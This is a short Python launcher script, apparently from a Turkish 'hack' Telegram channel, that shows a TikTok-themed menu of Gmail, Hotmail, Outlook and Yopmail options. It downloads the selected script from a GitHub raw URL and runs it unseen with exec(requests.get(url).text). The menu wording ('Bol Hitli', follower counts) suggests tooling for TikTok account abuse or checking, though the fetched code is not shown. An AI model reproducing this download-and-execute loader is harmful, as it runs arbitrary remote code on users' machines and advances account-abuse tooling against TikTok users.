import requests
import os
from cfonts import render         
import webbrowser
webbrowser.open("https://t.me/thomashack")      
kral = render('TIKTOK', colors=['green', 'white'], align='center')
print("\x1b[1;39m—" * 60)
print(kral)
print("~ Programmer : @T5OMASR |  Channel: @THOMASHACK ~")
print("\x1b[1;39m—" * 60)
print("\x1b[38;5;117m  1\x1b[38;5;231m - Tiktok Gmail [ No Vpn +100 takipçi ] | \x1b[1;32m Bakımda ❌")
print("\x1b[38;5;117m  2\x1b[38;5;231m - Tiktok Gmail  Bol Hitli [ Vpn Aç   ] | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  3\x1b[38;5;231m - Tiktok Hotmail +100 Takipçi  [ No Vpn  ] | \x1b[1;32m Bakımda ❌ ")
print("\x1b[38;5;117m  4\x1b[38;5;231m - Tiktok Outlook +100 Takipçi  [ No Vpn  ] | \x1b[1;32m Bakımda ❌")
print("\x1b[38;5;117m  5\x1b[38;5;231m - Tiktok Yopmail Random   [ No Vpn  ] | \x1b[1;32m aktif ✅")



def shelby():
    print("\x1b[1;39m—"*60)
    secim=input(" • Seciminiz : ")
    
    baglantilar = {
        "1": "https://raw.githubusercontent.com/t9omas/CANAVAROOOOO/refs/heads/main/tik-canavaro%20v1%F0%9F%87%B9%F0%9F%87%B7.py",
        "2": "https://raw.githubusercontent.com/t9omas/CANAVAROOOOO/refs/heads/main/tik-gm-canavatogv3_ninjapy.py",
        "3": "https://raw.githubusercontent.com/t9omas/CANAVAROOOOO/refs/heads/main/tik-canavarfffo-44hot_ninjapy.py",
        "4":"https://raw.githubusercontent.com/t9omas/CANAVAROOOOO/refs/heads/main/outlookkkkkk.py",
        "5":"https://raw.githubusercontent.com/t9omas/CANAVAROOOOO/refs/heads/main/tikyop-canavarov2_ninjapy.py"

        
        
    }
    if secim in baglantilar:thomas(baglantilar[secim])
    else:print("oc 1 ile 5 arasi girecen");shelby()
def thomas(url):
    try:exec(requests.get(url).text)
    except Exception as e:print(f"h-am{e}")
if __name__=="__main__":shelby()
    # @t5omasr / @thomashack
